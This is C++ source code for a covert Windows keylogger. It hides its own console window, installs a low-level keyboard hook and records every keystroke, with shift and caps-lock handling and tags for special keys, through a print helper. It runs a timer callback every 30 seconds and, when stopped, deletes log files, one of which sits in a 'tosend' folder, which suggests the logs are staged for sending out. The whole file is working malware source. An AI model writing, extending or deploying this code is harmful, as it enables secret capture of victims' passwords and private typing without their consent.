#include <Windows.h>
#include <stdio.h>
#include <iostream>

#include "print.h"

#define TIMER_VAL 102

//!< GLobal variables
HHOOK hHook = NULL;

//!< Function definitions
LRESULT CALLBACK MyKeyboardProc(int iCode, WPARAM wParam, LPARAM lParam);
int StartHook();
void StopHook();

int main()
{
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, HIDE_WINDOW);

	if (0 == StartHook())
		return 0;

	int timer = SetTimer(GetActiveWindow(),                // handle to main window 
		TIMER_VAL,               // timer identifier 
		30*1000,                 // 60-seconds interval 
		(TIMERPROC)TimerProc); // timer callback
	
	if (!timer)
	{
		printf("Timer Failed");
		StopHook();
		return 0;
	}
	MSG msg = {};
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	StopHook();
	return 0;
}
/********************************************************************************/
/* Setting Windows Hook
Reference to API:
https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990(v=vs.85).aspx */
/********************************************************************************/
int StartHook()
{
	//!< Get module instance
	HINSTANCE hInstance = GetModuleHandle(NULL);

	//!< Install Hook
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, MyKeyboardProc, hInstance, NULL);
	if (hHook == NULL)
		return 0;

	return true;
}

/********************************************************************************/
/*Callback function to SetWindowHook(Captures key strokes)
Reference to API:
https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985(v=vs.85).aspx
Reference to virtual key code
https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx*/
/********************************************************************************/

LRESULT CALLBACK MyKeyboardProc(int iCode, WPARAM wParam, LPARAM lParam)
{
	//!< Only Key down is being checked since it eliminate the double log with key up
	if (iCode == HC_ACTION && wParam == WM_KEYDOWN)
	{
		KBDLLHOOKSTRUCT *pKeystruct = (KBDLLHOOKSTRUCT *)lParam;
		DWORD vkCode = pKeystruct->vkCode;

		//!< system keys

		//!< letters from A to Z
		if (vkCode >= 0x41 && vkCode <= 0x5A)
		{
			//!< If the capital key state is true or if the shift key hold is true
			//!<  then print capital letter else small letter, if both are true then small
			if ((bool)GetKeyState(VK_CAPITAL) ^ (bool)GetAsyncKeyState(VK_SHIFT))
			{
				print(vkCode);
			}
			else
			{
				print(vkCode + 32);
			}
		}
		//!< numbers/symbols 0 - 9
		else if (vkCode >= 0x30 && vkCode <= 0x39)
		{
			if (GetAsyncKeyState(VK_SHIFT))
			{
				switch (vkCode)
				{
				case 0x30:
					print(')');
					break;
				case 0x31:
					print('!');
					break;
				case 0x32:
					print('@');
					break;
				case 0x33:
					print('#');
					break;
				case 0x34:
					print('$');
					break;
				case 0x35:
					print('%');
					break;
				case 0x36:
					print('^');
					break;
				case 0x37:
					print('&');
					break;
				case 0x38:
					print('*');
					break;
				case 0x39:
					print('(');
					break;
				}
			}
			else 
			{
				//!< ascii print
				print(vkCode);
			}
		}
		else if (vkCode >= 0x60 && vkCode <= 0x69)//!< numpad 0 to 9 which 30 more than ascii values of 0 to 9
		{
			print(vkCode - 0x30);
		}
		else if (vkCode >= 0x70 && vkCode <= 0x87)//!< Function keys
		{
			print("[F");
			print(vkCode - 0x40);
			print(']');
		}
		else //!< other important keys
		{
			switch (vkCode)
			{
			case VK_OEM_3:
				if (GetAsyncKeyState(VK_SHIFT))
					print('~'); 
				else
					print('`');
				break;
			case VK_OEM_MINUS:
				if (GetAsyncKeyState(VK_SHIFT))
					print('_');
				else
					print('-'); 
				break;
			case VK_OEM_PLUS:
				if (GetAsyncKeyState(VK_SHIFT))
					print('+');
				else
					print('=');
				break;
			case VK_OEM_1:
				if (GetAsyncKeyState(VK_SHIFT))
					print(':');
				else
					print(';');
				break;
			case VK_OEM_COMMA:
				if (GetAsyncKeyState(VK_SHIFT))
					print('<');
				else
					print(',');
				break;
			case VK_OEM_PERIOD:
				if (GetAsyncKeyState(VK_SHIFT))
					print('>');
				else
					print('.');
				break;
			case VK_OEM_2:
				if (GetAsyncKeyState(VK_SHIFT))
					print('?');
				else
					print('/');
				break;
			case VK_OEM_4:
				if (GetAsyncKeyState(VK_SHIFT))
					print('{');
				else
					print('[');
				break;
			case VK_OEM_5:
				if (GetAsyncKeyState(VK_SHIFT))
					print('|');
				else
					print(134);
				break;
			case VK_OEM_6:
				if (GetAsyncKeyState(VK_SHIFT))
					print('}');
				else
					print(']');
				break;
			case VK_OEM_7:
				if (GetAsyncKeyState(VK_SHIFT))
					print(35);
				else
					print(39);
				break;
			case VK_LBUTTON:
				print("[L_M]");
				break;
			case VK_RBUTTON:
				print("[R_M]");
				break;
			case VK_BACK:
				print("[BS]");
				break;
			case VK_TAB:
				print("[TAB]");
				break;
			case VK_RETURN:
				print("\n");
				break;
			case VK_LSHIFT:
			case VK_RSHIFT:
				print("[SHIFT]");
				break;
			case VK_LCONTROL:
			case VK_RCONTROL:
				print("[CONT]");
				break;
			case VK_LMENU:
			case VK_RMENU:
				print("[ALT]");
				break;
			case VK_CAPITAL:
				print("[CAP]");
				break;
			case VK_ESCAPE:
				print("[ESC]");
				break;
			case VK_SPACE:
				print(" ");
				break;
			case VK_PRIOR:
				print("[PG_UP]");
				break;
			case VK_NEXT:
				print("[PG_DN]");
				break;
			case VK_END:
				print("[END]");
				break;
			case VK_HOME:
				print("[HOME]");
				break;
			case VK_LEFT:
				print("[LEFT]");
				break;
			case VK_UP:
				print("[UP]");
				break;
			case VK_RIGHT:
				print("[RIGHT]");
				break;
			case VK_DOWN:
				print("[DOWN]");
				break;
			case VK_PRINT:
				print("[PRINT]");
				break;
			case VK_INSERT:
				print("[INSERT]");
				break;
			case VK_DELETE:
				print("[DELETE]");
				break;
			case VK_MULTIPLY:
				print("*");
				break;
			case VK_ADD:
				print("+");
				break;
			case VK_SUBTRACT:
				print('-');
				break;
			case VK_DECIMAL:
				print('.');
				break;
			case VK_DIVIDE:
				print('/');
				break;
			default:
				break;
			}
		}
	}
	return CallNextHookEx(hHook, iCode, wParam, lParam);
}

void StopHook()
{
	DeleteFileA("G:\\ProjectFiles\\log.txt");
	DeleteFileA("G:\\ProjectFiles\\tosend\\log.txt");
	//! To free the system resource associated with hook
	UnhookWindowsHookEx(hHook);
}